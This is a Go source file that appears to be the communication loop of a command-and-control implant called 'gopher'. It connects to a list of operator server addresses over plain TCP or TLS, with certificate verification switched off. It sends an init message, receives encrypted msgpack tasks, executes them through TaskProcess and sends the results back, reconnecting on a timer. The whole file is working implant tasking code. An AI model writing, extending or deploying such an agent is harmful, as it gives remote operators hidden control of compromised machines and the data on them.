package main

import (
	"crypto/tls"
	"crypto/x509"
	"gopher/functions"
	"gopher/utils"
	"net"
	"time"

	"github.com/vmihailenco/msgpack/v5"
)

// RunTCPLoop TCP通信主循环
// RunTCPLoop is the main TCP communication loop
func RunTCPLoop(profile utils.Profile, agentId uint32, initMsg []byte, encKey []byte, sessionKey []byte) {
	addrIndex := 0

	for i := 0; i < profile.ConnCount && ACTIVE; i++ {
		if i > 0 {
			time.Sleep(time.Duration(profile.ConnTimeout) * time.Second)
			addrIndex = (addrIndex + 1) % len(profile.Addresses)
		}

		///// Connect

		var (
			err  error
			conn net.Conn
		)

		if profile.UseSSL {
			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
			if certerr != nil {
				return
			}

			caCertPool := x509.NewCertPool()
			caCertPool.AppendCertsFromPEM(profile.CaCert)

			config := &tls.Config{
				Certificates:       []tls.Certificate{cert},
				RootCAs:            caCertPool,
				InsecureSkipVerify: true,
			}
			conn, err = tls.Dial("tcp", profile.Addresses[addrIndex], config)

		} else {
			conn, err = net.Dial("tcp", profile.Addresses[addrIndex])
		}
		if err != nil {
			continue
		} else {
			i = 0
		}

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(conn, profile.BannerSize)
			if err != nil {
				continue
			}
		}

		/// Send Init
		_ = functions.SendMsg(conn, initMsg)

		/// Recv Command

		var (
			inMessage  utils.Message
			outMessage utils.Message
			recvData   []byte
			sendData   []byte
		)

		for ACTIVE {
			recvData, err = functions.RecvMsg(conn)
			if err != nil {
				break
			}

			outMessage = utils.Message{Type: 0}
			recvData, err = utils.DecryptData(recvData, sessionKey)
			if err != nil {
				break
			}

			err = msgpack.Unmarshal(recvData, &inMessage)
			if err != nil {
				break
			}

			if inMessage.Type == 1 {
				outMessage.Type = 1
				outMessage.Object = TaskProcess(inMessage.Object)
			}

			sendData, _ = msgpack.Marshal(outMessage)
			sendData, _ = utils.EncryptData(sendData, sessionKey)
			_ = functions.SendMsg(conn, sendData)
		}
	}
}
